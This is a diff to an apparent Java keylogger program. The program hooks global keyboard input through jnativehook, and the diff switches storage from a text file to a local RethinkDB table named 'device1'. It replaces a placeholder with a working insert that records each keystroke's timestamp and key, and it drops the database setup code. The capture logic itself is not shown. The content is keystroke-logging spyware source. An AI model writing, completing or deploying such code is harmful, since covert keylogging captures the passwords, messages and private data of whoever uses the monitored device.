@@ -19,7 +19,6 @@ import java.util.logging.Logger;
 import org.jnativehook.GlobalScreen;
 
 import com.rethinkdb.RethinkDB;
-import com.rethinkdb.gen.exc.ReqlQueryLogicError;
 import com.rethinkdb.net.Connection;
 
 import java.io.File;
@@ -35,20 +34,19 @@ enum Mode {
 public class Keylogger {
     // DATABASE CONFIGURATION
     private static final String DB_NAME = "keylogger";
-    private static final String DB_TABLE_NAME = "keystrokes";
+    private static final String DB_TABLE_NAME = "device1";
     private static final String DB_HOST = "localhost";
     private static final int DB_PORT = 28015;
     // FILE CONFIGURATION
-    private static final String FILE_PATH = "src\\main\\resources\\keystrokes.txt";
+    private static final String FILE_PATH = "keystrokes.txt";
     
-    private static final Mode mode = Mode.FILE;
+    private static final Mode mode = Mode.DATABASE;
     private static final RethinkDB r = RethinkDB.r;
     private static Connection conn;
 
     private static void writeToDB(Stroke key) {
         if (key != null) {
-            System.out.println("not implemented yet");
-            System.exit(1);
+            r.db(DB_NAME).table(DB_TABLE_NAME).insert(r.hashMap("timestamp", key.getTimestamp()).with("key", key.getKey())).run(conn);
         }
     }
 
@@ -86,16 +84,6 @@ public class Keylogger {
 
         if (mode == Mode.DATABASE) {
             conn = r.connection().hostname(DB_HOST).port(DB_PORT).connect();
-            try {
-                r.dbCreate(DB_NAME).run(conn);
-            } catch (ReqlQueryLogicError e) {
-                // database already exists
-            }
-            try {
-                r.db(DB_NAME).tableCreate(DB_TABLE_NAME).run(conn);
-            } catch (ReqlQueryLogicError e) {
-                // table already exists
-            }
         }
         else if (mode == Mode.FILE) {
             try {
